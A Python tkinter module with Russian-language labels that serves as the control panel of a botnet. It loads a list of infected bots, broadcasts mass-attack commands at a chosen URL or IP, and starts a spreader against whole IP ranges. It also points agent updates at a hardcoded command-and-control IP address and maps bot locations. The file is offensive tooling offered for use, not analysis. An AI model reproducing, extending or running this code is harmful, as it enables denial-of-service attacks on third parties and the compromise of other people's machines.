import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import json
import os
import threading
import folium
import webbrowser
from botnet.c2 import broadcast_command
from engine.attack import AsyncAttackEngine
from utils.logger import log

class BotnetTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.bot_data = []
        self.build_ui()
        self.load_bots()

    def build_ui(self):
        control_frame = tk.Frame(self)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        tk.Button(control_frame, text="Обновить список", command=self.load_bots).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Обновить агент на VPS", command=self.update_agent_vps).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner).pack(side=tk.LEFT, padx=2)
        tk.Button(control_frame, text="Тепловая карта", command=self.show_heatmap).pack(side=tk.LEFT, padx=2)

        filter_frame = tk.Frame(self)
        filter_frame.pack(fill=tk.X, padx=5)
        tk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
        self.filter_entry = tk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())

        columns = ("ID", "IP", "OS", "Status", "Bandwidth")
        self.tree = ttk.Treeview(self, columns=columns, show="headings")
        for col in columns:
            self.tree.heading(col, text=col, command=lambda c=col: self.sort_by(c))
            self.tree.column(col, width=120)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.progress = ttk.Progressbar(self, mode="indeterminate")
        self.progress.pack(fill=tk.X, padx=5, pady=2)

        self.status_label = tk.Label(self, text="Ботов: 0")
        self.status_label.pack(anchor=tk.W, padx=5)

    def load_bots(self):
        if os.path.exists("bots.json"):
            with open("bots.json", "r") as f:
                raw_data = json.load(f)
        else:
            raw_data = []
        self.bot_data = []
        for item in raw_data:
            if isinstance(item, dict):
                bot = item.copy()
            elif isinstance(item, str):
                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
            else:
                continue
            bot.setdefault("id", "unknown")
            bot.setdefault("ip", "")
            bot.setdefault("os", "")
            bot.setdefault("status", "offline")
            bot.setdefault("bandwidth", 0)
            self.bot_data.append(bot)
        self.populate_tree()
        self.status_label.config(text=f"Ботов: {len(self.bot_data)}")

    def populate_tree(self, filtered=None):
        self.tree.delete(*self.tree.get_children())
        data = filtered if filtered is not None else self.bot_data
        for bot in data:
            self.tree.insert("", tk.END, values=(
                bot.get("id", ""),
                bot.get("ip", ""),
                bot.get("os", ""),
                bot.get("status", ""),
                f"{bot.get('bandwidth', 0)} Mbps"
            ))

    def apply_filter(self):
        text = self.filter_entry.get().lower()
        if not text:
            self.populate_tree()
            return
        filtered = [b for b in self.bot_data if text in str(b).lower()]
        self.populate_tree(filtered)

    def sort_by(self, col):
        idx = ["id", "ip", "os", "status", "bandwidth"].index(col.lower())
        self.bot_data.sort(key=lambda b: str(b.get(col.lower(), "")))
        self.populate_tree()

    def mass_attack(self):
        target = simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
        if not target:
            return
        self.progress.start()
        threading.Thread(target=self._do_mass_attack, args=(target,)).start()

    def _do_mass_attack(self, target):
        try:
            log(f"Запуск массовой атаки на {target}")
            broadcast_command({"action": "attack", "target": target})
        finally:
            self.progress.stop()

    def update_agent_vps(self):
        try:
            with open("avz_settings.json","r") as f:
                host = json.load(f).get("c2_host", "80.249.146.202")
        except:
            host = "80.249.146.202"
        log(f"Обновление агента на {host}...")
        # Здесь может быть реальная SSH-команда через ssh_manager
        messagebox.showinfo("Обновление агента", f"Команда на обновление отправлена на {host}")

    def mass_scanner(self):
        ip_range = simpledialog.askstring("Масс-сканер", "IP диапазон (CIDR):")
        if not ip_range:
            return
        log(f"Запущен масс-сканер на {ip_range}")
        threading.Thread(target=self._scan_range, args=(ip_range,)).start()

    def _scan_range(self, ip_range):
        # Используем spreader
        import asyncio
        from botnet.spreader import spread_to_range
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(spread_to_range(ip_range))

    def show_heatmap(self):
        locations = []
        for bot in self.bot_data:
            lat, lon = bot.get("lat"), bot.get("lon")
            if lat and lon:
                locations.append((lat, lon))
        if not locations:
            messagebox.showinfo("Карта", "Нет данных о местоположении ботов. Добавьте поле 'lat'/'lon' в bots.json")
            return
        m = folium.Map(location=[0, 0], zoom_start=2)
        for lat, lon in locations:
            folium.CircleMarker([lat, lon], radius=5, color="red", fill=True).add_to(m)
        m.save("heatmap.html")
        webbrowser.open("heatmap.html")
